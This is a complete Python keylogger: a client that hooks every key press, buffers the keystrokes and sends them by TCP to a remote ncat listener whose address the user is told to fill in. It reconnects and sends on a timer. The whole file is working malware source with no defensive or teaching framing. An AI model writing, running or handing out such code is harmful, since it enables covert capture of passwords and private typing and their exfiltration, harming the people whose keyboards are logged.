import socket
import keyboard
import threading
from time import sleep

# Configuration
HOST = '127.0.0.1'  # Replace with your ncat server IP
PORT = 4444  # Replace with your ncat server port
BUFFER_SIZE = 100  # Number of characters to store before sending
RECONNECT_DELAY = 5  # Seconds between connection attempts


class KeyLoggerClient:
    def __init__(self):
        self.buffer = []
        self.socket = None
        self.connected = False
        self.running = True

    def connect(self):
        """Establish connection to ncat server"""
        while self.running and not self.connected:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((HOST, PORT))
                self.connected = True
                print(f"[*] Connected to {HOST}:{PORT}")
            except Exception as e:
                print(f"[!] Connection failed: {str(e)}")
                sleep(RECONNECT_DELAY)

    def send_keys(self):
        """Send buffered keystrokes to server"""
        if self.connected and self.buffer:
            try:
                data = ''.join(self.buffer)
                self.socket.sendall(data.encode())
                self.buffer.clear()
            except Exception as e:
                print(f"[!] Send error: {str(e)}")
                self.connected = False
                self.socket.close()
                self.connect()

    def key_handler(self, event):
        """Process keyboard events"""
        key = event.name

        # Handle special keys
        if len(key) > 1:
            key = f'[{key.upper()}]'

        self.buffer.append(key)

        # Send if buffer reaches threshold
        if len(self.buffer) >= BUFFER_SIZE:
            self.send_keys()

    def start(self):
        """Start keylogging and network connection"""
        # Start connection thread
        connect_thread = threading.Thread(target=self.connect)
        connect_thread.daemon = True
        connect_thread.start()

        # Start keyboard listener
        keyboard.on_press(self.key_handler)

        # Periodic send every 30 seconds
        def periodic_send():
            while self.running:
                self.send_keys()
                sleep(30)

        send_thread = threading.Thread(target=periodic_send)
        send_thread.daemon = True
        send_thread.start()

        # Keep main thread alive
        while self.running:
            try:
                sleep(0.1)
            except KeyboardInterrupt:
                self.stop()

    def stop(self):
        """Cleanup and exit"""
        self.running = False
        if self.connected:
            self.socket.close()
        keyboard.unhook_all()
        print("[*] Keylogger stopped")


if __name__ == "__main__":
    print("Starting keylogger... (Ctrl+C to stop)")
    logger = KeyLoggerClient()
    logger.start()